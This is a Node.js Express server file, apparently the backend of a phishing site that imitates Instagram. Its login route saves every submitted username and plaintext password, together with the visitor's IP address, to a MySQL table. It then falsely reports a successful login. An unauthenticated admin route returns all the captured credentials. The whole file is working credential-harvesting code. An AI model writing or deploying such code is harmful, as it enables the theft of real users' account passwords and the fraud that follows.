const express = require('express');
const mysql = require('mysql2');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// MySQL Connection - Railway variables use karo
const db = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || 'yourpassword',
    database: process.env.DB_NAME || 'instagram_clone'
});

db.connect((err) => {
    if (err) {
        console.error('Database connection failed:', err);
        return;
    }
    console.log('✅ Connected to MySQL database');
});

// Create users table
const createTableQuery = `
    CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL,
        login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ip_address VARCHAR(45)
    )
`;

db.query(createTableQuery, (err) => {
    if (err) {
        console.error('Error creating table:', err);
    } else {
        console.log('✅ Users table ready');
    }
});

// Login route
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const query = 'INSERT INTO users (username, password, ip_address) VALUES (?, ?, ?)';
    
    db.query(query, [username, password, ip], (err, result) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Error saving credentials' });
        }
        res.json({ success: true, message: 'Login successful' });
    });
});

// Admin credentials route
app.get('/api/admin/credentials', (req, res) => {
    const query = 'SELECT * FROM users ORDER BY login_time DESC';
    
    db.query(query, (err, results) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Error fetching credentials' });
        }
        res.json(results);
    });
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve index page
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${port}`);
});